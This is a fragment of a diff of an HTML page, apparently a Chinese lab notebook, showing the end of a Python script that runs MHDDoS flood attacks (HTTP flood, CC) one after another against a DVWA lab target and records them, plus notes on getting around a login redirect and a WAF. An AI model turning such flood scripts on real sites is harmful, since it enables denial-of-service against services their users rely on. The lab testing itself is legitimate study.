+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;🚀 自动化实验开始 | 目标: </span><span style="color:#5af78e">{</span>TARGET_URL<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;📅 当前时间: </span><span style="color:#5af78e">{</span>datetime<span style="color:#ff6ac1">.</span>now()<span style="color:#ff6ac1">.</span>strftime(<span style="color:#5af78e">&#39;%H:%M:%S&#39;</span>)<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;⌛ 总预计耗时: </span><span style="color:#5af78e">{</span>total_duration <span style="color:#ff6ac1">//</span> <span style="color:#ff9f43">60</span><span style="color:#5af78e">}</span><span style="color:#5af78e"> 分 </span><span style="color:#5af78e">{</span>total_duration <span style="color:#ff6ac1">%</span> <span style="color:#ff9f43">60</span><span style="color:#5af78e">}</span><span style="color:#5af78e"> 秒&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;🏁 预计全部结束时间: </span><span style="color:#5af78e">{</span>eta_finish<span style="color:#ff6ac1">.</span>strftime(<span style="color:#5af78e">&#39;%H:%M:%S&#39;</span>)<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;=&#34;</span> <span style="color:#ff6ac1">*</span> <span style="color:#ff9f43">60</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> i, (name, tool, cmd, duration) <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">enumerate</span>(tasks, <span style="color:#ff9f43">1</span>):
+</span></span><span style="display:flex;"><span>        start_t_obj <span style="color:#ff6ac1">=</span> datetime<span style="color:#ff6ac1">.</span>now()
+</span></span><span style="display:flex;"><span>        start_t_str <span style="color:#ff6ac1">=</span> start_t_obj<span style="color:#ff6ac1">.</span>strftime(<span style="color:#5af78e">&#34;%H:%M&#34;</span>)
+</span></span><span style="display:flex;"><span>        task_eta <span style="color:#ff6ac1">=</span> start_t_obj <span style="color:#ff6ac1">+</span> timedelta(seconds<span style="color:#ff6ac1">=</span>duration)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">[任务 </span><span style="color:#5af78e">{</span>i<span style="color:#5af78e">}</span><span style="color:#5af78e">/</span><span style="color:#5af78e">{</span><span style="color:#ff5c57">len</span>(tasks)<span style="color:#5af78e">}</span><span style="color:#5af78e">] 执行中: </span><span style="color:#5af78e">{</span>name<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;⏱️ 预计此项结束时间: </span><span style="color:#5af78e">{</span>task_eta<span style="color:#ff6ac1">.</span>strftime(<span style="color:#5af78e">&#39;%H:%M:%S&#39;</span>)<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># 去掉 check=True，改为 check=False</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># 这样即使 MHDDoS 返回 1，脚本也会认为它运行结束了，继续往下走</span>
+</span></span><span style="display:flex;"><span>            result <span style="color:#ff6ac1">=</span> subprocess<span style="color:#ff6ac1">.</span>run(cmd, shell<span style="color:#ff6ac1">=</span><span style="color:#ff6ac1">True</span>, check<span style="color:#ff6ac1">=</span><span style="color:#ff6ac1">False</span>, cwd<span style="color:#ff6ac1">=</span>MHDDOS_PATH, capture_output<span style="color:#ff6ac1">=</span><span style="color:#ff6ac1">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># 记录为成功，因为我们知道它运行够了时间</span>
+</span></span><span style="display:flex;"><span>            end_t_str <span style="color:#ff6ac1">=</span> datetime<span style="color:#ff6ac1">.</span>now()<span style="color:#ff6ac1">.</span>strftime(<span style="color:#5af78e">&#34;%H:%M&#34;</span>)
+</span></span><span style="display:flex;"><span>            results<span style="color:#ff6ac1">.</span>append({<span style="color:#5af78e">&#34;type&#34;</span>: name, <span style="color:#5af78e">&#34;tool&#34;</span>: tool, <span style="color:#5af78e">&#34;time&#34;</span>: <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">{</span>start_t_str<span style="color:#5af78e">}</span><span style="color:#5af78e">~</span><span style="color:#5af78e">{</span>end_t_str<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>})
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;✅ 攻击任务已完成（程序退出码: </span><span style="color:#5af78e">{</span>result<span style="color:#ff6ac1">.</span>returncode<span style="color:#5af78e">}</span><span style="color:#5af78e">）&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">except</span> Exception <span style="color:#ff6ac1">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e"># 只有脚本自己崩了（比如找不到 Python 解释器）才会走这里</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;❌ 脚本逻辑触发异常: </span><span style="color:#5af78e">{</span>e<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#78787e"># --- 生成报告 ---</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34;=&#34;</span><span style="color:#ff6ac1">*</span><span style="color:#ff9f43">20</span> <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34; 实验结果统计 &#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34;=&#34;</span><span style="color:#ff6ac1">*</span><span style="color:#ff9f43">20</span>)
+</span></span><span style="display:flex;"><span>    md <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;|攻击类型|工具|时间段|</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">|-------|---|-----|</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> r <span style="color:#ff6ac1">in</span> results:
+</span></span><span style="display:flex;"><span>        md <span style="color:#ff6ac1">+=</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;|</span><span style="color:#5af78e">{</span>r[<span style="color:#5af78e">&#39;type&#39;</span>]<span style="color:#5af78e">}</span><span style="color:#5af78e">|</span><span style="color:#5af78e">{</span>r[<span style="color:#5af78e">&#39;tool&#39;</span>]<span style="color:#5af78e">}</span><span style="color:#5af78e">|</span><span style="color:#5af78e">{</span>r[<span style="color:#5af78e">&#39;time&#39;</span>]<span style="color:#5af78e">}</span><span style="color:#5af78e">|</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(md)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">with</span> <span style="color:#ff5c57">open</span>(<span style="color:#5af78e">&#34;report.md&#34;</span>, <span style="color:#5af78e">&#34;w&#34;</span>, encoding<span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;utf-8&#34;</span>) <span style="color:#ff6ac1">as</span> f:
+</span></span><span style="display:flex;"><span>        f<span style="color:#ff6ac1">.</span>write(md)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;💾 结果已保存至 </span><span style="color:#5af78e">{</span>os<span style="color:#ff6ac1">.</span>getcwd()<span style="color:#5af78e">}</span><span style="color:#5af78e">/report.md&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> <span style="color:#ff5c57">__name__</span> <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    run_research()</span></span></code></pre></div><h2 id="62-初代版本问题">6.2 初代版本问题<a class="anchor" href="#62-%e5%88%9d%e4%bb%a3%e7%89%88%e6%9c%ac%e9%97%ae%e9%a2%98">#</a></h2>
+<p>结果只得到了如图的结果，检测到使用明文登录，且url是<code>172.31.132.2:8080/login.php</code>而非<code>172.31.132.2:8080</code>
+<img src="/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2%E4%B8%8E%E6%94%BB%E5%87%BB/images/1.png" alt="" /></p>
+<p>因为DVWA是需要登录的，尚未携带有效 Session/Cookie 访问根目录，dvwa会强制给出<code>302 Found</code>响应，重定向到<code>/login.php</code></p>
+<p>而MHDDoS向<code>http://172.31.132.2:8080/login.php</code>发送<code>POST</code>请求时，防火墙的Web应用防护(WAF)模块介入，检测到有人通过非加密的HTTP协议，向一个登录界面提交POST表单。</p>
+<p><strong>改进思路</strong></p>
+<ol>
+<li>绕过302重定向：<code>TARGET_URL = &quot;http://172.31.132.2:8080/login.php&quot;</code>，直接攻击<code>login.php</code></li>
+<li>脚本中的<code>subprocess.run(..., check=False, shell=True)</code>修改为<code>subprocess.run(cmd, shell=True, check=False, cwd=MHDDOS_PATH, capture_output=False)</code></li>
+</ol>
+</article>
  
       
 
@@ -2085,6 +2251,22 @@ num  target     prot opt source               destination
         <li><a href="#34-database漏洞攻击sql-injection">3.4 database漏洞攻击（SQL Injection）✅</a></li>
         <li><a href="#35-口令暴力破解攻击brute-force">3.5 口令暴力破解攻击（Brute Force）✅</a></li>
         <li><a href="#36-iot漏洞攻击">3.6 IoT漏洞攻击✅</a></li>
+      </ul>
+    </li>
+    <li><a href="#四420攻击记录">四、4.20攻击记录</a></li>
+    <li><a href="#五慢速攻击和l7攻击测试">五、慢速攻击和L7攻击测试</a>
+      <ul>
+        <li><a href="#51-low-rate-ddos">5.1 low-rate ddos</a></li>
+        <li><a href="#52-mhdos">5.2 MHDoS</a></li>
+        <li><a href="#521-安装">5.2.1 安装</a></li>
+        <li><a href="#522-http-flood">5.2.2 HTTP Flood</a></li>
+        <li><a href="#523-cc攻击">5.2.3 CC攻击</a></li>
+      </ul>
+    </li>
+    <li><a href="#六慢速攻击和l7自动化攻击脚本">六、慢速攻击和L7自动化攻击脚本</a>
+      <ul>
+        <li><a href="#61-脚本">6.1 脚本</a></li>
+        <li><a href="#62-初代版本问题">6.2 初代版本问题</a></li>
       </ul>
     </li>
   </ul>
